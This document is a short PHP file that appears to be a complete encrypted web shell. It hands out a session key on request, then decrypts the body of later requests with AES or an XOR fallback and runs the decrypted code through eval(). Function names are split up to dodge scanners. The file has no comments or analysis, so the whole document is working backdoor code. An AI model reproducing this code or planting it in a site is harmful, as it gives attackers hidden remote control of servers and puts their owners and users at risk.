<?php
@error_reporting(0);session_start();if(isset($_GET['aiqy'])){$a=substr(md5(uniqid(rand())),16);$_SESSION['k']=$a;print $a;}else{$a=$_SESSION['k'];$b=file_get_contents("php://input");if(!extension_loaded('openssl')){$c="base64_"."decode";$b=$c($b."");for($d=0;$d<strlen($b);$d++){$b[$d]=$b[$d]^$a[$d+1&15];}}else{$b=openssl_decrypt($b,"AES128",$a);}$e=explode('|',$b);$f=$e[0];$g=$e[1];class C{public function __construct($h){eval($h."");}}@new C($g);}?>